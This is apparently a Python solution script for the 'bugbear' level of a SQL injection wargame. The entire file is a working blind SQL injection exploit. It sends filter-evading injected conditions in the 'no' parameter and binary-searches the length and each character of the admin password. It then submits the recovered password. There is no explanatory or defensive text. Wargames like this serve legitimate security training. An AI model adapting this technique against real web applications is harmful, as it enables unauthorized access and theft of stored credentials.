import requests

url = 'https://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php'

cookies = {
	'__cfduid': '',
	'PHPSESSID': ''
}

payload = {
	'no': ''
}

# Guess the length of password.
low, high = 0, 128
while True:
	mid = int((low + high) / 2)
	sqli = '1	||	id	<>	"guest"	&&	length(pw)	<	%d' % mid
	print(sqli)
	payload['no'] = sqli
	res = requests.get(url, cookies=cookies, params=payload)
	if res.text.find('Hello admin') > -1:
		high = mid
		print('Go lower to %d...' % mid)
	else:
		low = mid
		print('Go higher to %d...' % mid)
	
	if high - low <= 1:
		break
len_of_pw = low
print('The length of pw is %d.' % len_of_pw)

# Guess the password one by one.
pw = ''
for i in range(len_of_pw+1):
	low, high = 0, 127
	
	while True:
		mid = int((low + high) / 2)
		sqli = '1	||	id	<>	"guest"	&&	hex(mid(pw,%d,1))	<	hex(%d)' % (i, mid)
		payload['no'] = sqli
		res = requests.get(url, cookies=cookies, params=payload)
		if res.text.find('Hello admin') > -1:
			high = mid
			print('Go lower to %c(%d)...' % (chr(mid), mid))
		else:
			low = mid
			print('Go higher to %c(%d)...' % (chr(mid), mid))

		if high - low <= 1:
			break
	pw = pw + str(chr(low))
	print('Sniff Sniff...', pw)
print('The password is', pw)

payload['no'] = '1'
payload['pw'] = pw
res = requests.get(url, cookies=cookies, params=payload)
print(res.text)